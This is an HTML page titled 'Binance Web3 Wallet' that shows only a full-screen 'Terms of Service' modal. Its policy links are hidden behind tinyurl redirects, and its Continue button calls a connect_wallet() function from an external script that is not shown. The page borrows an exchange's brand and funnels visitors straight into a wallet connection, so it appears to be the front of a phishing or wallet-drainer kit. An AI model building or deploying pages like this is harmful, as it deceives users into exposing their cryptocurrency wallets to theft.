<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
  <title>Binance Web3 Wallet</title>
  <link href="https://cdn.jsdelivr.net/npm/daisyui@3.8.3/dist/full.css" rel="stylesheet" type="text/css" />
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    var tailwind = {
      config: {
        daisyui: {
          themes: ["dark"],
        },
      }
    };
  </script>
  <style id="dynamic-theme-styles">
    :root {
      --modal-primary-color: #000000; 
      --modal-secondary-color: #000000;
      --modal-primary-dimmed: #000000; 
      --modal-secondary-dimmed: #000000;
      --loader-primary-color: #000000; 
      --loader-secondary-color: #000000;
    }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(135deg, var(--modal-primary-dimmed) 0%, var(--modal-secondary-dimmed) 100%) !important;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      overflow: hidden;
    }
    .modal {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 100%;
      position: fixed;
      top: 0;
      left: 0;
      z-index: 100000;
      background: linear-gradient(135deg, var(--modal-primary-dimmed) 0%, var(--modal-secondary-dimmed) 100%) !important;
    }
    .modal-box {
      background: rgba(30, 30, 30, 0.9);
      backdrop-filter: blur(12px);
      border-radius: 20px;
      border: 1px solid var(--modal-primary-color);
      padding: 24px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3),
                  inset 0 2px 4px rgba(255, 255, 255, 0.1),
                  0 4px 8px rgba(0, 0, 0, 0.2);
      color: #ffffff;
      position: relative;
    }
    .modal-box h3 {
      font-size: 1.75rem;
      font-weight: 600;
      text-align: center;
      margin-bottom: 20px;
      color: var(--modal-primary-color);
    }
    .modal-box p {
      color: rgba(255, 255, 255, 0.85);
      font-size: 0.95rem;
      line-height: 1.6;
      margin-bottom: 16px;
    }
    .modal-box a {
      color: var(--modal-primary-color);
      text-decoration: none;
    }
    .modal-box a:hover {
      color: var(--modal-primary-color);
      text-decoration: underline;
    }
    .action-button {
      background-color: var(--modal-primary-color);
      color: #000000;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 12px 24px;
      font-weight: 500;
      width: 100%;
    }
    .action-button:hover:not(:disabled) {
      background-color: var(--modal-secondary-color);
      color: #ffffff;
    }
    .action-button:disabled {
      background-color: #4b5563;
      color: rgba(255, 255, 255, 0.6);
      cursor: not-allowed;
      opacity: 0.7;
    }
    .checkbox {
      border-color: rgba(255, 255, 255, 0.3);
      background: rgba(255, 255, 255, 0.05);
      border-radius: 4px;
    }
    .checkbox:checked {
      background: var(--modal-primary-color);
      border-color: var(--modal-secondary-color);
    }
    .label-text {
      color: rgba(255, 255, 255, 0.85);
      font-size: 0.9rem;
      line-height: 1.4;
    }
    dialog[open] {
      display: flex !important;
      visibility: visible !important;
      z-index: 100000;
    }
    @media (max-width: 640px) {
      .modal, dialog[open] {
        align-items: flex-end;
        padding: 0;
      }
      .modal-box {
        border-radius: 20px 20px 0 0;
        width: 100%;
        max-width: 100%;
        margin-bottom: 0;
        bottom: 0;
        left: 0;
        right: 0;
      }
    }
  </style>
</head>
<body>
  <div class="min-h-screen flex items-center justify-center p-4">
    <dialog id="my_pre_modal" class="modal">
      <div class="modal-box">
        <h3>Terms of Service</h3>
        <p>By using our service, you agree to abide by our 
          <a href="http://tinyurl.com/2bzedkjh">Privacy Policy</a> and 
          <a href="http://tinyurl.com/2yncfxwt">Terms of Service</a>. 
          Please confirm that you are not a bot to proceed.
        </p>
        <div class="form-control grid gap-4">
          <label class="label cursor-pointer flex items-start gap-3">
            <input 
              type="checkbox" 
              class="checkbox mt-1" 
              onchange="document.getElementById('btn-to-continue').disabled = !this.checked;"
            />
            <span class="label-text">
              I agree to the Terms of Service and Privacy Policy and confirm that I am not a bot.
            </span>
          </label>
        </div>
        <div class="pt-6">
          <button 
            id="btn-to-continue" 
            class="action-button" 
            disabled 
            onclick="document.getElementById('my_pre_modal').close();connect_wallet()"
          >
            Continue
          </button>
        </div>
      </div>
    </dialog>
  </div>
  <script src="../assets/index.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/dialog-polyfill@0.5.6/dist/dialog-polyfill.min.js"></script>
</body>
</html>
